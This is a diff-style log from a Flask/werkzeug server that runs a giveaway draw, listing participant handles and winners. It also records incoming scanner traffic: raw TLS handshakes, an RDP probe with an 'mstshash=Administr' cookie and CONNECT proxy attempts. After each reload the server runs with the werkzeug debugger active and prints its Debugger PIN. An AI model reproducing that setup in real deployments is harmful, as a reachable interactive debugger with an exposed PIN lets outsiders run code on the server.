+ERROR:werkzeug:198.235.24.128 - - [18/Jul/2024 11:19:54] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03±_\x16vñªÅ\x02Þpë£y\x8aPV\x15\x01a\x80\x07ÀkU¤\x86\x91æ¸©\x84\x83\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+INFO:werkzeug:198.235.24.128 - - [18/Jul/2024 11:19:54] "[35m[1m\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03±_\x16vñªÅ\x02Þpë£y\x8aPV\x15\x01a\x80\x07ÀkU¤\x86\x91æ¸©\x84\x83\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:92.118.39.205 - - [18/Jul/2024 11:26:48] "[33mGET / HTTP/1.1[0m" 404 -
+INFO:werkzeug:92.118.39.205 - - [18/Jul/2024 11:26:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+INFO:werkzeug:147.185.132.228 - - [18/Jul/2024 11:47:38] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:134.209.24.124 - - [18/Jul/2024 12:15:50] code 400, message Bad request version ("A½ú\x99\x06kßÕÚÌ\xadMÌW\x1b)j'Ý´\x89\x92kp6F¯\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À")
+INFO:werkzeug:134.209.24.124 - - [18/Jul/2024 12:15:50] "[35m[1m\x16\x03\x01\x01ý\x01\x00\x01ù\x03\x03\x1cb\x9aÂ A½ú\x99\x06kßÕÚÌ­MÌW\x1b)j'Ý´\x89\x92kp6F¯\x00\x01<Ì\x14Ì\x13Ì\x15À0À,À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:main:循环执行超时，退出循环2。
+INFO:main:参与名单： ['菓子-月跡', 'Prelighting_', '大型强化玻璃', '渡辺千叶', '飛鳥啲悲傷ASUKA', '请不要吃掉朋友', '条_Offcial', '了不起的呵呵君', '六片装饼干', 'TUTU君', 'Nanarikom', '丿丿三红航空', '阿昱-910', 'BETA_REBORN', '二狐official', '镜明丶', '小湾睡觉', 'Cure_Makimaki', '藍同学N', '五十嵐矢', 'Anyouchuan', '欢闪闪', '夜子吱吱丶', 'WARUDOKAOSU_info', '浣熊仔在垃圾桶安家', 'CardinaI_', '曹先生_wb', '五十三535353', '多点运气小琼霄', '威思睿', '麦麦今天吃什么', '世良小姐的信徒kita_', '爱猫上班族', '刹那梦海', 'ClariS_墨墨', 'FUYU-TOXIC', '0v0_kita', '小炫咩呜', '晴雨-Seiu', 'm0_137mo3', '空白爱喝丢丢', '小狼炸蘑菇咕咕咕', 'Subaru_路人乙', '封风凌', '音无200605', '78Yizumi_', '輪廻丶', '凹_孤魂野鬼', '卖报纸就找我', '深秋的晚宴与天空树', '红鼻子的米鹿', '随遇而安TeaZ', 'gbcck', '奈奈奈奈特1', '徹夜部_AllNight', '甜甜的鱼娘', 'rektboiz', '豚丼-', '俗物zokubutsu', 'HIGUCHI-TOXIC', 'MrBiggerWorse比格沃斯', '晨羽Calvin____', '-茕立-', '兰H亚里亚', '热心观众某光', '风摇不动的铃', '芙兰朵露君', '夜羽夜羽耶', 'Frederick铸洲', 'NewUniv03', 'Serika厨', 'Tenke1_Mae5h1ma', '晓安lll', '無聲de軒', '空心菜籽油', '文月Rika_L0111POP', '要爽就来兵工厂ARS', '七梦TAT', '梓色蛙声', '蓝狼_Dehydrated', '羊驼驼y托', '爱本宝宝的安安', '长安_绝赞沉迷_女人bot', '连川的Cello', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', '西野七七七七七', '棠照Tanwzao', '来把你麦开开来', 'UxU1', '泠-Amemiya', 'REI-TOXIC', '綺麗的赤', 'LQ你就是个不求上进的傻消音']
+INFO:main:中奖者：二狐official
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 13:53:08] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['藍同学N', '芙兰朵露君', '夜羽夜羽耶', '菓子-月跡', 'Prelighting_', '五十嵐矢', '卖报纸就找我', 'NewUniv03', 'Serika厨', 'Tenke1_Mae5h1ma', '请不要吃掉朋友', 'Anyouchuan', '無聲de軒', '夜子吱吱丶', '深秋的晚宴与天空树', '了不起的呵呵君', '六片装饼干', 'CardinaI_', '曹先生_wb', '红鼻子的米鹿', '随遇而安TeaZ', '五十三535353', '多点运气小琼霄', 'TUTU君', 'gbcck', '奈奈奈奈特1', '要爽就来兵工厂ARS', '徹夜部_AllNight', '梓色蛙声', '世良小姐的信徒kita_', '爱猫上班族', '甜甜的鱼娘', '蓝狼_Dehydrated', '羊驼驼y托', '爱本宝宝的安安', 'ClariS_墨墨', '长安_绝赞沉迷_女人bot', 'FUYU-TOXIC', '豚丼-', '俗物zokubutsu', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', '二狐official', '镜明丶', '0v0_kita', '西野七七七七七', '小炫咩呜', 'm0_137mo3', '晴雨-Seiu', '晨羽Calvin____', 'UxU1', '棠照Tanwzao', '-茕立-', '小湾睡觉', '封风凌', '綺麗的赤', '音无200605', '风摇不动的铃']
+INFO:main:中奖者：橘猫Masashi, 夜羽夜羽耶, 晴雨-Seiu, 五十三535353, 伤诚君_Riko理理专属夸夸Bot, 卖报纸就找我
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 13:56:15] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug: * Detected change in '/root/code/myweb-server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 190-361-937
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['羊驼驼y托', '0v0_kita', 'MrBiggerWorse比格沃斯', 'LQ你就是个不求上进的傻消音', '大型强化玻璃', '深秋的晚宴与天空树', 'Frederick铸洲', 'NewUniv03', '五十嵐矢', 'UxU1', '浣熊仔在垃圾桶安家', '六片装饼干', '条_Offcial', '兰H亚里亚', '多点运气小琼霄', '奈奈奈奈特1', '徹夜部_AllNight', '镜明丶', 'Subaru_路人乙', '橘猫Masashi', '阿昱-910', '棠照Tanwzao', '豚丼-', '78Yizumi_', '小炫咩呜', '晓安lll', 'm0_137mo3', '曹先生_wb', '世良小姐的信徒kita_', '甜甜的鱼娘', '封风凌', '威思睿', '五十三535353', '俗物zokubutsu', '夜子吱吱丶', '爱猫上班族', 'gbcck', '了不起的呵呵君', '泠-Amemiya', '夜羽夜羽耶', '二狐official', '西野七七七七七', '卖报纸就找我', 'CardinaI_', '连川的Cello', '-茕立-', '飛鳥啲悲傷ASUKA', '刹那梦海', '长安_绝赞沉迷_女人bot', '渡辺千叶', '七梦TAT', '梓色蛙声', '请不要吃掉朋友', '蓝狼_Dehydrated', '晨羽Calvin____', '爱本宝宝的安安', 'Nanarikom', '要爽就来兵工厂ARS', '风摇不动的铃', '菓子-月跡', '晴雨-Seiu', '空白爱喝丢丢', '热心观众某光', '音无200605', '藍同学N', 'REI-TOXIC', '红鼻子的米鹿', '丿丿三红航空', '空心菜籽油', '欢闪闪', 'BETA_REBORN', '無聲de軒', '随遇而安TeaZ', 'TUTU君', '伤诚君_Riko理理专属夸夸Bot', '輪廻丶', '小湾睡觉', '小狼炸蘑菇咕咕咕', '文月Rika_L0111POP', 'FUYU-TOXIC', '来把你麦开开来', 'Cure_Makimaki', 'Prelighting_', 'rektboiz', 'Serika厨', '麦麦今天吃什么', 'Anyouchuan', 'Tenke1_Mae5h1ma', '綺麗的赤', 'HIGUCHI-TOXIC', '凹_孤魂野鬼', 'WARUDOKAOSU_info', '芙兰朵露君', 'ClariS_墨墨']
+INFO:main:中奖者：泠-Amemiya, 风摇不动的铃, 卖报纸就找我, 六片装饼干, 丿丿三红航空, FUYU-TOXIC
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 13:57:35] "POST /api/draw HTTP/1.0" 200 -
+ERROR:werkzeug:80.66.76.134 - - [18/Jul/2024 14:00:11] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+INFO:werkzeug:80.66.76.134 - - [18/Jul/2024 14:00:11] "[35m[1m\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug: * Detected change in '/root/code/myweb-server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 190-361-937
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', 'LQ你就是个不求上进的傻消音', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', 'Cure_Makimaki', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '文月Rika_L0111POP', '镜明丶', 'WARUDOKAOSU_info', '空心菜籽油', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：MrBiggerWorse比格沃斯, BETA_REBORN, 长安_绝赞沉迷_女人bot, Serika厨, 蓝狼_Dehydrated, 西野七七七七七
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 14:01:33] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', 'LQ你就是个不求上进的傻消音', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', 'Cure_Makimaki', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '文月Rika_L0111POP', '镜明丶', 'WARUDOKAOSU_info', '空心菜籽油', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：綺麗的赤, 夜子吱吱丶, 輪廻丶, CardinaI_, gbcck, 晓安lll
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 14:02:14] "POST /api/draw HTTP/1.0" 200 -
+ERROR:werkzeug:93.174.95.106 - - [18/Jul/2024 14:45:17] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03\x8c\x8f\x88\\|s\x95ó\x89')
+INFO:werkzeug:93.174.95.106 - - [18/Jul/2024 14:45:17] "[35m[1m\x16\x03\x01\x00ô\x01\x00\x00ð\x03\x03\x8c\x8f\x88\\|s\x95ó\x89 f\x12õÐód\x03È\x89ã\x10\x18»tmàØ¨ùd§u\x00\x00rÀ0À,À(À$À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:93.174.95.106 - - [18/Jul/2024 14:45:20] "[33mGET / HTTP/1.1[0m" 404 -
+ERROR:werkzeug:96.126.104.20 - - [18/Jul/2024 15:11:23] code 400, message Bad request version ('E¢ÌÂâhôÛÒ|')
+INFO:werkzeug:96.126.104.20 - - [18/Jul/2024 15:11:23] "[35m[1m\x16\x03\x01\x00ò\x01\x00\x00î\x03\x03>M\x96Þ\x83&\x8d\x88àn+\x0c\x1c[:wRÀÙuâïù\x9a\x19\x80w\x96D\x85\x84ä \x8c\x15)a\x10°{1Mí@\x9b\x98\x00ºLÆ²ß\x1dE¢ÌÂâhôÛÒ|[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:96.126.104.20 - - [18/Jul/2024 15:11:23] "[33mGET /signin HTTP/1.1[0m" 404 -
+INFO:werkzeug:94.156.66.83 - - [18/Jul/2024 15:29:06] "[33mCONNECT 193.149.189.126:7227 HTTP/1.1[0m" 404 -
+ERROR:werkzeug:216.218.206.66 - - [18/Jul/2024 15:31:05] code 400, message Bad request version ('À\x14À')
+INFO:werkzeug:216.218.206.66 - - [18/Jul/2024 15:31:05] "[35m[1m\x16\x03\x01\x00{\x01\x00\x00w\x03\x03¡Ó+°31ëQ¶\x0e£(\x90¿\x85é\x81µè,/Û\x06l»\x06T=¼Å!$\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À[0m" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:94.156.71.226 - - [18/Jul/2024 15:48:50] "[33mCONNECT 45.61.136.175:7227 HTTP/1.1[0m" 404 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '世界爆炸扎比子', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', '香米抹茶小昱', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '镜明丶', 'WARUDOKAOSU_info', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：世界爆炸扎比子, FUYU-TOXIC, 六片装饼干, 泠-Amemiya, Serika厨, 藍同学N
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 15:55:02] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '世界爆炸扎比子', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', '香米抹茶小昱', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '镜明丶', 'WARUDOKAOSU_info', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：橘猫Masashi, 欢闪闪, 深秋的晚宴与天空树, Nanarikom, 晓安lll, 要爽就来兵工厂ARS
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 15:57:40] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['FUYU-TOXIC', '晴雨-Seiu', 'REI-TOXIC', '红鼻子的米鹿', '条_Offcial', '0v0_kita', '爱本宝宝的安安', '伤诚君_Riko理理专属夸夸Bot', '橘猫Masashi', 'CardinaI_', '五十嵐矢', '空白爱喝丢丢', '輪廻丶', 'UxU1', '晨羽Calvin____', '五十三535353', '阿昱-910', '风摇不动的铃', '多点运气小琼霄', '奈奈奈奈特1', '夜羽夜羽耶', 'ClariS_墨墨', '小炫咩呜', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '长安_绝赞沉迷_女人bot', '世界爆炸扎比子', '音无200605', '西野七七七七七', 'gbcck', '藍同学N', '爱猫上班族', '热心观众某光', '飛鳥啲悲傷ASUKA', '镜明丶', 'WARUDOKAOSU_info', '六片装饼干', '甜甜的鱼娘', 'TUTU君', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '羊驼驼y托', '-茕立-', '俗物zokubutsu', '綺麗的赤', '芙兰朵露君', 'Tenke1_Mae5h1ma', 'Subaru_路人乙', '深秋的晚宴与天空树', '徹夜部_AllNight', 'm0_137mo3', '大型强化玻璃', 'Anyouchuan', '香米抹茶小昱', 'NewUniv03', '封风凌', '请不要吃掉朋友', '凹_孤魂野鬼', '丿丿三红航空', '78Yizumi_', 'Frederick铸洲', '豚丼-', '棠照Tanwzao', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '菓子-月跡', '夜子吱吱丶', '小湾睡觉', '蓝狼_Dehydrated', '曹先生_wb', '二狐official']
+INFO:main:中奖者：Frederick铸洲, 蓝狼_Dehydrated, 空白爱喝丢丢, 二狐official, FUYU-TOXIC, 五十嵐矢
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 15:58:06] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '世界爆炸扎比子', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', '香米抹茶小昱', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '镜明丶', 'WARUDOKAOSU_info', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：世良小姐的信徒kita_, Tenke1_Mae5h1ma, 橘猫Masashi, 梓色蛙声, 飛鳥啲悲傷ASUKA, 连川的Cello
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 15:58:29] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['小狼炸蘑菇咕咕咕', '晴雨-Seiu', 'MrBiggerWorse比格沃斯', '红鼻子的米鹿', 'CardinaI_', '五十嵐矢', '五十三535353', '随遇而安TeaZ', '無聲de軒', '要爽就来兵工厂ARS', '西野七七七七七', '音无200605', '爱猫上班族', '藍同学N', '热心观众某光', '飛鳥啲悲傷ASUKA', '晓安lll', '甜甜的鱼娘', 'TUTU君', '綺麗的赤', '七梦TAT', '威思睿', 'NewUniv03', '凹_孤魂野鬼', '兰H亚里亚', 'REI-TOXIC', '橘猫Masashi', '条_Offcial', 'LQ你就是个不求上进的傻消音', '伤诚君_Riko理理专属夸夸Bot', 'UxU1', '多点运气小琼霄', 'Cure_Makimaki', '浣熊仔在垃圾桶安家', 'Subaru_路人乙', '泠-Amemiya', '请不要吃掉朋友', '丿丿三红航空', '78Yizumi_', '棠照Tanwzao', '小湾睡觉', 'FUYU-TOXIC', '0v0_kita', '爱本宝宝的安安', '空白爱喝丢丢', '奈奈奈奈特1', 'ClariS_墨墨', '渡辺千叶', 'gbcck', '-茕立-', '羊驼驼y托', '来把你麦开开来', '俗物zokubutsu', 'BETA_REBORN', '大型强化玻璃', 'm0_137mo3', 'Nanarikom', 'Serika厨', '了不起的呵呵君', 'Prelighting_', '麦麦今天吃什么', 'Frederick铸洲', '輪廻丶', '蓝狼_Dehydrated', '曹先生_wb', '二狐official', '晨羽Calvin____', '连川的Cello', 'HIGUCHI-TOXIC', '阿昱-910', '风摇不动的铃', '夜羽夜羽耶', '小炫咩呜', '长安_绝赞沉迷_女人bot', '文月Rika_L0111POP', '镜明丶', 'WARUDOKAOSU_info', '空心菜籽油', '六片装饼干', '梓色蛙声', '卖报纸就找我', '世良小姐的信徒kita_', '芙兰朵露君', 'Tenke1_Mae5h1ma', '刹那梦海', 'rektboiz', '深秋的晚宴与天空树', '徹夜部_AllNight', 'Anyouchuan', '封风凌', '豚丼-', '欢闪闪', '菓子-月跡', '夜子吱吱丶']
+INFO:main:中奖者：空白爱喝丢丢
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 16:50:08] "POST /api/draw HTTP/1.0" 200 -
+INFO:main:文件内容未变化。
+INFO:main:参与名单： ['鹿语诉说', '小何宝宝ovo', 'kkkkkkkce', '氪与延迟', '热可可200505', '是也泽呀', '云泽会希望运气好一点', 'rolfo', 'Zefolx丶', 'Antoniofromhaze', '啊叭叭叭叭叭叭叭叭叭叭叭叭叭', '勇敢的龟龟mzh', '晴诗-Sveinn', '晏枸斜晖', '给人整无语了咧', '椰青美式好喝好喝', 'Eltashi13', '四爪噬金兽', '聚合果酱', '墨小夜201205', '用户7933471292', '三凉1124', '埃尔不污', '重生之我是山宝枕边人', '-岚崎-', '裟椤mp4', '是小猪叔', 'Rim68145', '二喵喵奇', 'kkskshd', '来自极北的雪飒', '西行寺墨墨子', '三味竹饭', '滴雾任歌骑冻', '只想摸鱼fishcat', '超绝後蚁', '言曦咕了', '这是在干啥原来是我在摆烂', '咸虎一只', '二喵奇']
+INFO:main:中奖者：重生之我是山宝枕边人
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "POST /api/draw HTTP/1.0" 200 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:31] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:werkzeug:127.0.0.1 - - [18/Jul/2024 17:17:32] "[35m[1mPOST /api/draw HTTP/1.0[0m" 500 -
+INFO:main:文件内容未变化。
